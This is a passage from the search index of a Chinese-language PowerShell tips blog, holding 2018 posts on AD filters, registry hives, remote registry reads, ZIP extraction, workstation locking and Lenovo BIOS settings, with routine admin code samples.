“co”。当您坚持使用这些名字后，创建 LDAP 过滤器十分容易。 这行代码将会从 Active Directory 中获取所有 Windows 10 计算机： 12Get-ADComputer -LDAPFilter '(operatingSystem=*10*)' -Properties operatingSystem |Select-Object samaccountname, operatingSystem 如果您想合并多个过滤器，请将它们加到小括号中，然后在前面添加 “&amp;” 进行逻辑与操作，添加 “|” 进行逻辑或操作。所以这行代码查找所有从 Wuppertal 城市，名字以 “A” 开头的用户： 1Get-ADUser -LDAPFilter '(&amp;(l=Wuppertal)(name=a*))'","link":"/2018/08/02/using-ad-filters-with-cmdlets-part-3/"},{"title":"PowerShell 技能连载 - 使用 AD 过滤器配合 cmdlet（第 4 部分）","text":"在前一个技能中，我们开始学习 ActiveDirectory 模块（免费的 RSAT 工具）中的 cmdlet 如何过滤执行结果，并且学习了如何合并过滤器表达式。今天我们将学习如何处理日期和时间。 有些 AD 属性包含日期和时间信息，例如上次登录的日期。这类信息是以一串非常长的 64 位整数标识的。您可以在 LDAP 过滤器中以这种格式使用日期和时间。 例如，要查找近 4 个星期中没有修改密码的所有用户： 123456789101112131415161718192021222324252627$weeks = 4# first, find out the AD time format from# 4 weeks ago that will be used in the LDAPFilter$today = Get-Date# 4 weeks ago$cutDate = $today.AddDays(-($weeks * 7))# translate in AD time format$cutDateAD = $cutDate.ToFileTimeUtc()# next, find a way to convert back the AD file format$realDate = @{ Name = 'Date' Expression = { if ($_.pwdLastset -eq 0) { '[never]' } else { [DateTime]::FromFileTimeUtc($_.pwdLastset) } }}Get-ADUser -LDAPFilter &quot;(pwdLastSet&lt;=$cutDateAD)&quot; -Properties pwdLastSet | Select-Object -Property samaccountname, $realDate 实际上，当调用一个 DateTime 对象的 ToFileTimeUtc() 方法之后，将返回 AD 格式的数据。类似地，当您运行 [DateTime]::FromFileTimeUtc() 时，将会把 AD 格式转换为一个真实的 DateTime 对象。","link":"/2018/08/03/using-ad-filters-with-cmdlets-part-4/"},{"title":"PowerShell 技能连载 - 使用 PSGraph","text":"PSGraph 是一个非常棒的免费 PowerShell 库，您可以用它来将关系可视化。在使用 PSGraph 之前，需要安装它的依赖项（graphviz 引擎）。两者都需要管理员特权： 12345678#requires -RunAsAdministrator# install prerequisite (graphviz)Register-PackageSource -Name Chocolatey -ProviderName Chocolatey -Location http://chocolatey.org/api/v2/Find-Package graphviz | Install-Package -ForceBootstrap# install PowerShell moduleInstall-Module -Name PSGraph 安装完成后，这是如何将对象关系可视化的代码： 12345678910111213141516171819202122232425$webServers = 'Web1','Web2','web3'$apiServers = 'api1','api2'$databaseServers = 'db1'graph site1 { # External/DMZ nodes subgraph 0 -Attributes @{label='DMZ'} { node 'loadbalancer' @{shape='house'} rank $webServers node $webServers @{shape='rect'} edge 'loadbalancer' $webServers } subgraph 1 -Attributes @{label='Internal'} { # Internal API servers rank $apiServers node $apiServers edge $webServers -to $apiServers # Database Servers rank $databaseServers node $databaseServers @{shape='octagon'} edge $apiServers -to $databaseServers }} | Export-PSGraph -ShowGraph 这个例子中创建的图形使用脚本文件中的 hypothetical 服务器并向其添加合适的关系，并显示图像。","link":"/2018/08/06/using-psgraph/"},{"title":"PowerShell 技能连载 - 检查 USB 设备","text":"如果想知道某个特定的设备是否连接到您的计算机上，您可以使用 WMI 来提取所有即插即用设备的名称： 12Get-WmiObject -Class Win32_PnpEntity | Select-Object -ExpandProperty Caption","link":"/2018/08/07/checking-for-usb-devices/"},{"title":"PowerShell 技能连载 - 查看 Windows 生成号","text":"当运行 winver.exe 时，您可以方便地获取到完整的 Windows 生成号。通过 PowerShell 读取生成号并不是那么明显。并没有内置的 cmdlet。 不过，要创建这样功能的函数很简单： 123456function Get-OSInfo{ $path = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' Get-ItemProperty -Path $path -Name CurrentBuild, UBR, ReleaseID, CompositionEditionID | Select-Object -Property CurrentBuild, UBR, ReleaseID, CompositionEditionID} 结果看起来类似这样： 12345PS C:\\&gt; Get-OSInfoCurrentBuild UBR ReleaseId CompositionEditionID------------ --- --------- --------------------15063 1088 1703 Enterprise","link":"/2018/08/08/finding-windows-build-numbers/"},{"title":"PowerShell 技能连载 - 在可扩展字符串中分隔变量","text":"当使用双引号字符串时，您可以扩展它们当中的变量，类似这样： 12PS C:\\&gt; &quot;Windir: $env:windir&quot;Windir: C:\\Windows 然而，没有明显的方法来标记变量的起止位置，所以以下操作将会失败： 12PS C:\\&gt; &quot;$env:windir: this is my Windows folder&quot; this is my Windows folder 解决方案是使用大括号来标识字符串内变量的起止位置： 12PS C:\\&gt; &quot;${env:windir}: this is my Windows folder&quot;C:\\Windows: this is my Windows folder","link":"/2018/08/09/separating-variables-in-expandable-strings/"},{"title":"PowerShell 技能连载 - 自动获取借口","text":"Invoke-WebRequest 可以从网页获取 HTML 信息，并且可以用正则表达式来提取这些页面中的信息。 以下是一些可以获取英文的借口的代码： 123456789$ProgressPreference = 'SilentlyContinue'$url = &quot;http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl?$(Get-Random)&quot;$page = Invoke-WebRequest -Uri $url -UseBasicParsing$pattern = '(?s)&lt;br&gt;&lt;font\\ size\\ =\\ &quot;\\+2&quot;&gt;(.{1,})&lt;/font'if ($page.Content -match $pattern){ $matches[1].Trim() -replace '\\n', '' -replace '\\r', ''} 以下代码将获取英语和德语混合的借口： 123456$page= Invoke-WebRequest &quot;http://www.netzmafia.de/cgi-bin/bofhserver.cgi&quot;$pattern='(?s)&lt;B&gt;(.*?)&lt;/B&gt;'if ($page.Content -match $pattern){ $matches[1].Trim() -replace '\\n', '' -replace '\\r', ''}","link":"/2018/08/10/getting-excuses-automatically-pt1/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中运行 CMD 命令","text":"PowerShell 默认情况下不支持原生的 cmd.exe 命令，例如 “dir“。替代的是，它使用历史别名 “dir“ 指向最接近的 PowerShell cmdlet： 12345PS C:\\&gt; Get-Command -Name dir | ft -AutoSizeCommandType Name Version Source----------- ---- ------- ------Alias dir -&gt; Get-ChildItem 这解释了为什么 PowerShell 中的 “dir“ 不支持 cmd.exe 以及批处理文件中的开关和参数，例如 “cmd.exe/w“。 如果您必须使用 cmd 形式的命令，请用 /c 参数（代表 “command”）启动一个原生的 cmd.exe，执行这条命令，并在 PowerShell 内处理执行结果。这个例子运行 cmd.exe /c，然后以参数 /w 运行旧的 “dir“ 命令： 1PS C:\\&gt; cmd.exe /c dir /w 一个更安全的方法是使用 “--%“ 操作符： 1PS C:\\&gt; cmd.exe --% /c dir /w 当在参数之前添加了它之后，PowerShell 解释器将不会对参数进行处理，这样您甚至可以像在 cmd.exe 中一样使用环境变量注解。副作用是：您在参数中不再能使用 PowerShell 技术，比如变量： 1PS C:\\&gt; cmd.exe --% /c dir %WINDIR% /w","link":"/2018/08/13/running-cmd-commands-in-powershell/"},{"title":"PowerShell 技能连载 - 管理 Windows 功能（第 1 部分）","text":"Windows 10 带来一系列功能，但默认只安装了一个子集。您可以手工打开控制面板查看 Windows 功能。有经验的管理员也会使用 dism.exe 命令行工具。 在 PowerShell 中，您可以通过 Get-WindowsOptionalFeature 查看 Windows 功能的状态。当您指定了 -Online 参数，该 cmdlet 将返回当前可用的功能和它们的状态。 使用 Where-Object 命令，您可以容易地过滤结果，并且例如只显示未安装的功能清单： 1234567# list all Windows features and their stateGet-WindowsOptionalFeature -Online | Out-GridView# list only available features that are not yet installedGet-WindowsOptionalFeature -Online | Where-Object State -eq Disabled | Out-GridView","link":"/2018/08/14/managing-windows-features-part-1/"},{"title":"PowerShell 技能连载 - 管理 Windows 功能（第 2 部分）","text":"在 Windows 10 中，不像 Windows Server，您无法使用 Get-WindowsFeature 和 Add-WindowsFeature cmdlet 来管理 Windows 功能。 然而，对于客户端来说，有一个很类似的 cmdlet 可用：Enable-WindowsOptionalFeature。以下代码将添加 PowerShell Hyper-V cmdlet 和 Hyper-V 功能： 12Enable-WindowsOptionalFeature -Online -All -FeatureName Microsoft-Hyper-V-Management-PowerShell -NoRestartEnable-WindowsOptionalFeature -Online -All -FeatureName Microsoft-Hyper-V -NoRestart 执行的结果是一个对象，告知您是否需要重启。 请注意 -All 参数：如果您忽略了该参数，那么您需要自行确保所有先决条件和依赖项都已安装好，才能添加另一个新项。如果您懒，或者不了解依赖项，那么 -All 参数将自动为您安装所有必须的依赖项。","link":"/2018/08/15/managing-windows-features-part-2/"},{"title":"PowerShell 技能连载 - 使用注册表用户配置单元","text":"读写注册表的 HKEY_LOCAL_USER 十分容易，因为这个配置单元对于所有用户都一致。那么如何读写其他用户的 HKEY_CURRENT_USER 配置单元？ 假设您是管理员并且希望为其他用户的 HKEY_CURRENT_USER 配置单元添加注册表值。 首先您需要挂载该用户的用户配置单元。该配置单元位于该用户的用户配置文件下的 NTUSER.DAT 文件中。作为一个管理员，您需要先运行以下 PowerShell 代码来挂载 UserTobias 用户的用户配置文件： 1PS C:\\&gt; REG LOAD HKEY_Users\\UserTobias &quot;C:\\Users\\Tobias\\NTUSER.DAT&quot; 该用户配置单元将挂载在 HKEY_USERS 下名为 UserTobias 的注册表键中，而且 PowerShell 可以类似这样存取该路径： 12345678910111213141516PS C:\\&gt; Get-ChildItem -Path Registry::HKEY_USERS\\UserTobias Hive: HKEY_USERS\\UserTobiasName Property---- --------AppEventsConsole ColorTable00 : 789516 ColorTable01 : 14300928 ColorTable02 : 958739 ColorTable03 : 14521914 ColorTable04 : 2035653 ColorTable05 : 9967496 ColorTable06 : 40129 现在要读取甚至写入该指定用户的配置单元十分容易。以下代码将创建一个新的注册表键： 1PS C:\\&gt; $null = New-Item -Path Registry::HKEY_USERS\\UserTobias\\Software\\Microsoft\\Windows\\CurrentVersion\\Test 以下是如何读取/写入一个值： 123456789101112131415161718192021222324PS C:\\&gt; Get-ItemProperty -Path Registry::HKEY_USERS\\UserTobias\\Software\\Microsoft\\OneDriveEnableDownlevelInstallOnBluePlus : 0EnableTHDFFeatures : 1PSPath : Microsoft.PowerShell.Core\\Registry::HKEY_USERS\\UserTobias\\Software\\Microsoft\\OneDrivePSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_USERS\\UserTobias\\Software\\MicrosoftPSChildName : OneDrivePSProvider : Microsoft.PowerShell.Core\\RegistryPS C:\\&gt; Set-ItemProperty -Path Registry::HKEY_USERS\\UserTobias\\Software\\Microsoft\\OneDrive -Name EnableDownlevelInstallOnBluePlus -Value 1 -Type DWordPS C:\\&gt; Get-ItemProperty -Path Registry::HKEY_USERS\\UserTobias\\Software\\Microsoft\\OneDriveEnableDownlevelInstallOnBluePlus : 1EnableTHDFFeatures : 1PSPath : Microsoft.PowerShell.Core\\Registry::HKEY_USERS\\UserTobias\\Software\\Microsoft\\OneDrivePSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_USERS\\UserTobias\\Software\\MicrosoftPSChildName : OneDrivePSProvider : Microsoft.PowerShell.Core\\Registry 当您操作完 HKEY_USERS 注册表配置单元之后，别忘了卸载它： 1PS C:\\&gt; $null = REG UNLOAD HKEY_Users\\UserTobias 请注意这条命令将会抛出一个 “Access Denied” 错误，如果您没有管理员特权，或者该注册表配置单元正在被其他人使用。例如，如果您启动了 regedit.exe，当该用户配置单元加载以后，regedit.exe 可以显示加载的用户配置单元，而当 regedit 处于打开状态时，该配置单元被锁定并且无法关闭。","link":"/2018/08/16/manipulating-registry-user-hive/"},{"title":"PowerShell 技能连载 - 强化 PowerShell 脚本块的日志","text":"当您启用了 ScriptBlockLogging 后，PowerShell 将会记录所有在您机器上执行的所有 PowerShell 代码。如果没有启用它，所有安全相关的代码仍然会记录。这样很不错。然而，该任何用户都可以读取该日志，所以任何人都可以类似这样浏览记录下的代码: 1Get-WinEvent -FilterHashtable @{ ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id = 4104 } To harden security and limit the access to the log file, you have two choices:要强化安全并限制日志文件的读取，您有两个选择： 您可以通过安装数字证书来设置加密的日志。通过这种方法，记录的数据可以被保护起来，甚至其他的管理员同事也无法读取。然而，设置和管理这些证书并不那么简单。 您可以增强 PowerShell 操作日志的存取安全，并且使用和传统的安全日志相同的存取方式。通过这种方法，只有管理员可以读取该日志。这是我们今天要在本技能中讨论的方案： 1234567891011121314151617181920212223#requires -RunAsAdministrator# this is where the PowerShell operational log stores its settings$Path = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\winevt\\Channels\\Microsoft-Windows-PowerShell/Operational&quot;# get the default SDDL security definition for the classic security log$sddlSecurity = ((wevtutil gl security) -like 'channelAccess*').Split(' ')[-1]# get the current SDDL security for the PowerShell log$sddlPowerShell = (Get-ItemProperty -Path $Path).ChannelAccess# store the current SDDL security (just in case you want to restore it later)$existsBackup = Test-Path -Path $Pathif (!$existsBackup){ Set-ItemProperty -Path $Path -Name ChannelAccessBackup -Value $sddlPowerShell}# set the hardened security to the PowerShell operational logSet-ItemProperty -Path $Path -Name ChannelAccess -Value $sddlSecurity# restart the service to take effectRestart-Service -Name EventLog -Force 当您运行该脚本时，读取 PowerShell 操作日志的权限被限制为只有本地管理员。","link":"/2018/08/17/hardening-powershell-script-block-logging-log/"},{"title":"PowerShell 技能连载 - 远程读取配置表（第 1 部分）","text":"如果您无法使用 PowerShell 远程处理，那么您需要通过 DCOM 从另一个系统中读取注册表值，以下是一些您可能希望试验的示例代码： 12345678910111213141516$ComputerName = 'pc01'# NOTE: RemoteRegistry Service needs to run on a target system!$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $ComputerName)$key = $reg.OpenSubKey('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall')$key.GetSubKeyNames() | ForEach-Object { $subkey = $key.OpenSubKey($_) [PSCustomObject]@{ Name = $subkey.GetValue(‘DisplayName’) Version = $subkey.GetValue(‘DisplayVersion’) } $subkey.Close() }$key.Close()$reg.Close() 只需要做一些小改动，该代码就能返回一个 AD 使用的列表 这段示例代码需要： 您有目标机器的本地管理员特权 RemoteRegistry 服务在对方机器上运行 对方机器的本地防火墙启用了“远程管理例外”","link":"/2018/08/20/reading-registry-remotely-part-1/"},{"title":"PowerShell 技能连载 - 远程读取配置表（第 2 部分）","text":"在前一个例子中我们演示了使用早期的 DCOM 协议从远程读取另一台机器的注册表代码。 如果您可以使用 PowerShell 远程处理，情况变得更简单。您现在可以简单地编写在本机可运行的代码，然后将它“发射”到目标机器（支持多台）： 123456789101112131415161718# adjust this to a remote computer of your choice# (or multiple computers, comma-separated)# PowerShell remoting needs to be enabled on that computer# and you need to have local Admin privileges on that computer$ComputerName = 'pc01'# execute this code remotely on the machine(s)$code = { # read the given registry value... Get-ItemProperty -Path hklm:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | # and show the reg values with the names below Select-Object DisplayName, DisplayVersion, UninstallString}# &quot;beam&quot; the code over to the target computer(s), and retrieve# the result, then show it in a grid view windowInvoke-Command -ScriptBlock $code -ComputerName $ComputerName | Out-GridView 通过使用 PowerShell 远程处理，您只需要确保 PowerShell 远程处理的先决条件都具备。您可以用这条命令（需要本地管理员特权）： 1PS C:\\&gt; Enable-PSRemoting -SkipNetworkProfileCheck -Force","link":"/2018/08/21/reading-registry-remotely-part-2/"},{"title":"PowerShell 技能连载 - 优化命令自动完成","text":"PowerShell 控制台（powershell.exe、pwsh.exe）提供了可扩展的自动完成支持。当您输入了一个空格和一个连字符，按下 TAB 键将循环切换可用的参数。 Windows PowerShell (powershell.exe) 与 Linux 和 macOS 的 PowerShell (pwsh.exe) 之间有一个巨大的差异。当您在后者中按下 TAB 键，它们将立即显示所有可用的选项，并且您可以选择一个需要的建议。 要为 powershell.exe 添加这个行为，只需要运行这行代码： 1PS C:\\&gt; Set-PSReadlineOption -EditMode Emacs 下次当您输入参数的开头部分并按下 TAB 键时，您可以立即见到所有可用的选择。接下来，当重复输入这个命令时，您可以键入选择的首字母，按下 TAB 键即可完成选择。 这时候 Windows 用户可能会听到烦人的警告音。要关闭警告音，请运行： 1PS C:\\&gt; Set-PSReadlineOption -BellStyle None","link":"/2018/08/22/optimizing-command-completion/"},{"title":"PowerShell 技能连载 - 使用 profile 脚本","text":"默认情况下，PowerShell 在重新运行时会自动“忘记”某些设置。如果您需要“保持”设置，您需要使用 profile 脚本。当 PowerShell 在任何情况下启动时，会运行一段脚本。您可以向该脚本中添加任何命令。 这行代码将会打开当前的 PowerShell profile 脚本，而如果目前该脚本不存在，将会用 notepad 创建一个： 1PS C:\\&gt; notepad $profile 您现在可以向 profile 脚本增加这段代码： 12&quot;Hello $env:username!&quot;Set-Alias -Name web -Value &quot;$env:ProgramFiles\\Internet Explorer\\iexplore.exe&quot; 您也可以运行这段代码来确保允许 PowerShell 执行本地脚本： 1PS C:\\&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force 下一次您运行 PowerShell 时，它将会向您致礼，并且创建一个新的名为 “web“ 的别名。该别名可以在 Internet Explorer 中打开网页： 1PS C:\\&gt; web www.powershellmagazine.com","link":"/2018/08/23/using-profile-scripts1/"},{"title":"PowerShell 技能连载 - 验证变量内容","text":"从 PowerShell 5 开始，您可以为一个变量增加一个验证器。该验证器可以接受一个正则表达式，而且当您向该变量赋值时，该验证其检查新内容是否匹配正则表达式模式。如果不匹配，将会抛出一个异常，而该变量内容保持不变。 以下是一个存储 MAC 地址的变量示例： 1[ValidatePattern('^[a-fA-F0-9:]{17}|[a-fA-F0-9]{12}$')][string]$mac = '12:AB:02:33:12:22' 运行这段代码，然后尝试将一个新的 mac 地址赋值给该变量。如果新的 mac 地址不符合验证器，PowerShell 将抛出一个异常。","link":"/2018/08/24/validating-variable-content/"},{"title":"PowerShell 技能连载 - 提取 ZIP 压缩包信息","text":"PowerShell 提供了新的 cmdlet，例如 Extract-Archive，可以从一个 ZIP 文件中解压（所有的）文件。然而，并没有方法列出一个 ZIP 文件中的内容。 要实现这个目的，您可以使用 Extract-Archive 中使用的 .NET 库。这段代码将输入一个 ZIP 文件并提取它的内容（请确保您将 ZIP 的路径改为一个实际存在的路径）： 123456789# adjust this to a valid path to a ZIP file$Path = &quot;$Home\\Desktop\\Test.zip&quot;# load the ZIP typesAdd-Type -AssemblyName System.IO.Compression.FileSystem$zip = [System.IO.Compression.ZipFile]::OpenRead($Path)$zip.Entries$zip.Dispose()","link":"/2018/08/27/dumping-zip-archive-content/"},{"title":"PowerShell 技能连载 - 从 ZIP 压缩包中解压指定的文件","text":"PowerShell 提供了新的 cmdlet，例如 Extract-Archive，可以从一个 ZIP 文件中解压（所有的）文件。然而，只能解压整个压缩包。 如果您希望解压独立的文件，您可以使用 .NET 方法。以下是一个实现的示例： 它打开一个 ZIP 文件来读取内容 它查找该 ZIP 文件中所有符合指定文件扩展名的文件 它只解压这些文件到您指定的输出目录 代码中的注释解释了代码在做什么。只需要确保您调整了初始变量并且制定了一个存在的 ZIP 文件，以及一个在 ZIP 文件中存在的文件扩展名： 1234567891011121314151617181920212223242526272829303132333435363738394041#requires -Version 5.0# change $Path to a ZIP file that exists on your system!$Path = &quot;$Home\\Desktop\\Test.zip&quot;# change extension filter to a file extension that exists# inside your ZIP file$Filter = '*.wav'# change output path to a folder where you want the extracted# files to appear$OutPath = 'C:\\ZIPFiles'# ensure the output folder exists$exists = Test-Path -Path $OutPathif ($exists -eq $false){ $null = New-Item -Path $OutPath -ItemType Directory -Force}# load ZIP methodsAdd-Type -AssemblyName System.IO.Compression.FileSystem# open ZIP archive for reading$zip = [System.IO.Compression.ZipFile]::OpenRead($Path)# find all files in ZIP that match the filter (i.e. file extension)$zip.Entries | Where-Object { $_.FullName -like $Filter } | ForEach-Object { # extract the selected items from the ZIP archive # and copy them to the out folder $FileName = $_.Name [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, &quot;$OutPath\\$FileName&quot;, $true) }# close ZIP file$zip.Dispose()# open out folderexplorer $OutPath","link":"/2018/08/28/extract-specific-files-from-zip-archive/"},{"title":"PowerShell 技能连载 - 检测 WinPE","text":"PowerShell 可以在 WinPE 环境中运行。如果您希望检测 PowerShell 脚本是否运行在 WinPE 员警中，您只需要检查某个注册表键是否存在： 1234function Test-WinPE{ return Test-Path -Path Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlset\\Control\\MiniNT} 如果您在 WinPE 环境中运行，这个函数返回 $true。","link":"/2018/08/29/detecting-winpe/"},{"title":"PowerShell 技能连载 - 锁定工作站","text":"如果您希望在 PowerShell 中锁定当前工作站，您可以利用 PowerShell 可以运行可执行程序的特性。以下是一个使用 rundll32.exe 来调用一个 Windows 内部函数来锁定工作站的快速函数： 1234function Lock-Workstation{ rundll32.exe user32.dll,LockWorkStation}","link":"/2018/08/30/locking-workstation1/"},{"title":"PowerShell 技能连载 - 探索 PowerShell 模块","text":"大多数 cmdlet 和函数是 PowerShell 模块的一部分。如果您希望探索这些命令究竟是从哪儿来的，以下是一个简单的实践。 123456789101112131415# replace the command name with any PowerShell command name# you'd like to explore$Name = &quot;Get-Printer&quot;$ModuleName = (Get-Command -Name $Name -CommandType Function, Cmdlet).Sourceif ('' -eq $ModuleName){ Write-Warning &quot;$Name was defined in memory, no module available.&quot; return}Write-Warning &quot;$Name resides in $ModuleName module&quot;$module = Get-Module -Name $ModuleName -ListAvailableexplorer $module.ModuleBase 只需要将 $name 改为您希望探索的任何 PowerShell cmdlet 名称即可。如果该命令存在于一个 PowerShell 模块中，该模块将打开一个 Windows 资源管理器，您可以在其中检查它的内容。","link":"/2018/08/31/exploring-powershell-modules/"},{"title":"PowerShell 技能连载 - 管理 Lenovo BIOS 设置（第 1 部分）","text":"不幸的是，没有一个标准的方法来管理计算机厂商的 BIOS 设置。每个厂商使用专有的方法。对于 Lenovo 电脑，您可以使用 WMI 来存取和转储 BIOS 设置： 12345678910Get-WmiObject -Class Lenovo_BiosSetting -Namespace root\\wmi |Where-Object CurrentSetting |ForEach-Object { $parts = $_.CurrentSetting.Split(',') [PSCustomObject]@{ Setting = $parts[0] Status = $parts[1] Active = $_.Active }} 结果看起来类似这样： Setting Status Active ------- ------ ------ WakeOnLAN ACOnly True WakeOnLANDock Enable True EthernetLANOptionROM Enable True IPv4NetworkStack Enable True IPv6NetworkStack Enable True UefiPxeBootPriority IPv4First True WiGigWake Disable True WirelessAutoDisconnection Disable True MACAddressPassThrough Disable True USBBIOSSupport Disable True AlwaysOnUSB Enable True TrackPoint Automatic True TouchPad Automatic True FnCtrlKeySwap Disable True FnSticky Disable True FnKeyAsPrimary Disable True BootDisplayDevice LCD True SharedDisplayPriority DockDisplay True TotalGraphicsMemory 256MB True BootTimeExtension Disable True SpeedStep Enable True AdaptiveThermalManagementAC MaximizePerformance True AdaptiveThermalManagementBattery Balanced True CPUPowerManagement Automatic True OnByAcAttach Disable True PasswordBeep Disable True KeyboardBeep Enable True AMTControl Enable True USBKeyProvisioning Disable True WakeByThunderbolt Enable True ThunderboltSecurityLevel UserAuthorization True PreBootForThunderboltDevice Disable True PreBootForThunderboltUSBDevice Disable True LockBIOSSetting Disable True MinimumPasswordLength Disable True BIOSPasswordAtUnattendedBoot Enable True BIOSPasswordAtReboot Disable True BIOSPasswordAtBootDeviceList Disable True PasswordCountExceededError Enable True FingerprintPredesktopAuthentication Enable True FingerprintReaderPriority External True FingerprintSecurityMode Normal True FingerprintPasswordAuthentication Enable True SecurityChip Enable True TXTFeature Disable True PhysicalPresenceForTpmProvision Disable True PhysicalPresenceForTpmClear Enable True BIOSUpdateByEndUsers Enable True SecureRollBackPrevention Enable True WindowsUEFIFirmwareUpdate Enable True DataExecutionPrevention Enable True VirtualizationTechnology Enable True VTdFeature Enable True EthernetLANAccess Enable True WirelessLANAccess Enable True WirelessWANAccess Enable True BluetoothAccess Enable True USBPortAccess Enable True MemoryCardSlotAccess Enable True SmartCardSlotAccess Enable True IntegratedCameraAccess Enable True MicrophoneAccess Enable True FingerprintReaderAccess Enable True ThunderboltAccess Enable True NfcAccess Enable True WiGig Enable True BottomCoverTamperDetected Disable True InternalStorageTamper Disable True ComputraceModuleActivation Enable True SecureBoot Disable True SGXControl SoftwareControl True DeviceGuard Disable True BootMode Quick True StartupOptionKeys Enable True BootDeviceListF12Option Enable True BootOrder USBCD:USBFDD:NVMe0:HDD0:USBHDD:PCILAN True NetworkBoot USBFDD True BootOrderLock Disable True","link":"/2018/09/03/managing-lenovo-bios-settings-part-1/"},{"title":"PowerShell 技能连载 - 管理 Lenovo BIOS 设置（第 2 部分）","text":"在前一个技能中，我们解释了如何转储 Lenovo 计算机的 BIOS 设置。要调整设置，您需要了解某个设置支持的各种选项。以下是一段转储某个（Lenovo 电脑的）BIOS 设置的所有可选项的代码： 1234567#requires -RunAsAdministrator# this is case-sensitive$Setting = &quot;WakeOnLAN&quot;$selections = Get-WmiObject -Class Lenovo_GetBiosSelections -Namespace root\\wmi$selections.GetBiosSelections($Setting).Selections.Split(',') 请注意这段代码需要管理员特权。并且该设置名称是大小写敏感的。结果类似这样： Disable ACOnly ACandBattery Enable 这可能是一个显示如何获取当前 BIOS 设置，以及合法设置的列表的复杂示例： 123456789101112131415#requires -RunAsAdministrator$selections = Get-WmiObject -Class Lenovo_GetBiosSelections -Namespace root\\wmiGet-WmiObject -Class Lenovo_BiosSetting -Namespace root\\wmi |Where-Object CurrentSetting |ForEach-Object { $parts = $_.CurrentSetting.Split(',') [PSCustomObject]@{ CurrentSetting = $parts[0] Status = $parts[1] Active = $_.Active AvailableSettings = $selections.GetBiosSelections($parts[0]).Selections.Split(',') }} | Out-GridView 结果类似如下： CurrentSetting Status Active AvailableSettings -------------- ------ ------ ----------------- WakeOnLAN ACOnly True {Disable, ACOnly, ACandBattery,... WakeOnLANDock Enable True {Disable, Enable} EthernetLANOptionROM Enable True {Disable, Enable} IPv4NetworkStack Enable True {Disable, Enable} IPv6NetworkStack Enable True {Disable, Enable} UefiPxeBootPriority IPv4First True {IPv6First, IPv4First} WiGigWake Disable True {Disable, Enable} WirelessAutoDisconnection Disable True {Disable, Enable} MACAddressPassThrough Disable True {Disable, Enable} USBBIOSSupport Disable True {Disable, Enable} AlwaysOnUSB Enable True {Disable, Enable} TrackPoint Automatic True {Disable, Automatic} TouchPad Automatic True {Disable, Automatic} FnCtrlKeySwap Disable True {Disable, Enable} FnSticky Disable True {Disable, Enable} FnKeyAsPrimary Disable True {Disable, Enable} BootDisplayDevice LCD True {LCD, USBTypeC, HDMI, DockDisplay} SharedDisplayPriority DockDisplay True {HDMI, DockDisplay} TotalGraphicsMemory 256MB True {256MB, 512MB} BootTimeExtension Disable True {Disable, 1, 2, 3...} SpeedStep Enable True {Disable, Enable} AdaptiveThermalManagementAC MaximizePerformance True {MaximizePerformance, Balanced} AdaptiveThermalManagementBattery Balanced True {MaximizePerformance, Balanced} CPUPowerManagement Automatic True {Disable, Automatic} OnByAcAttach Disable True {Disable, Enable} PasswordBeep Disable True {Disable, Enable} KeyboardBeep Enable True {Disable, Enable} AMTControl Enable True {Disable, Enable, Disable} USBKeyProvisioning Disable True {Disable, Enable} WakeByThunderbolt Enable True {Disable, Enable} ThunderboltSecurityLevel UserAuthorization True {NoSecurity, UserAuthorization,... PreBootForThunderboltDevice Disable True {Disable, Enable, Pre-BootACL} PreBootForThunderboltUSBDevice Disable True {Disable, Enable} LockBIOSSetting Disable True {Disable, Enable} MinimumPasswordLength Disable True {Disable, 4, 5, 6...} BIOSPasswordAtUnattendedBoot Enable True {Disable, Enable} BIOSPasswordAtReboot Disable True {Disable, Enable} BIOSPasswordAtBootDeviceList Disable True {Disable, Enable} PasswordCountExceededError Enable True {Disable, Enable} FingerprintPredesktopAuthentication Enable True {Disable, Enable} FingerprintReaderPriority External True {External, InternalOnly} FingerprintSecurityMode Normal True {Normal, High} FingerprintPasswordAuthentication Enable True {Disable, Enable} SecurityChip Enable True {Active, Inactive, Disable, Ena... TXTFeature Disable True {Disable, Enable} PhysicalPresenceForTpmProvision Disable True {Disable, Enable} PhysicalPresenceForTpmClear Enable True {Disable, Enable} BIOSUpdateByEndUsers Enable True {Disable, Enable} SecureRollBackPrevention Enable True {Disable, Enable} WindowsUEFIFirmwareUpdate Enable True {Disable, Enable} DataExecutionPrevention Enable True {Disable, Enable} VirtualizationTechnology Enable True {Disable, Enable} VTdFeature Enable True {Disable, Enable} EthernetLANAccess Enable True {Disable, Enable} WirelessLANAccess Enable True {Disable, Enable} WirelessWANAccess Enable True {Disable, Enable} BluetoothAccess Enable True {Disable, Enable} USBPortAccess Enable True {Disable, Enable} MemoryCardSlotAccess Enable True {Disable, Enable} SmartCardSlotAccess Enable True {Disable, Enable} IntegratedCameraAccess Enable True {Disable, Enable} MicrophoneAccess Enable True {Disable, Enable} FingerprintReaderAccess Enable True {Disable, Enable} ThunderboltAccess Enable True {Disable, Enable} NfcAccess Enable True {Disable, Enable} WiGig Enable True {Disable, Enable} BottomCoverTamperDetected Disable True {Disable, Enable} InternalStorageTamper Disable True {Disable, Enable} ComputraceModuleActivation Enable True {Disable, Enable, Disable} SecureBoot Disable True {Disable, Enable} SGXControl SoftwareControl True {Disable, Enable, SoftwareControl} DeviceGuard Disable True {Disable, Enable} BootMode Quick True {Quick, Diagnostics} StartupOptionKeys Enable True {Disable, Enable} BootDeviceListF12Option Enable True {Disable, Enable} BootOrder USBCD:USBFDD:NVMe0:HDD0:USBHDD:PCILAN True {HDD0, HDD1, HDD2, HDD3...} NetworkBoot USBFDD True {HDD0, HDD1, HDD2, HDD3...} BootOrderLock Disable True {Disable, Enable}","link":"/2018/09/04/managing-lenovo-bios-settings-part-2/"},{"title":"PowerShell 技能连载 - 管理 Lenovo BIOS 设置（第 3 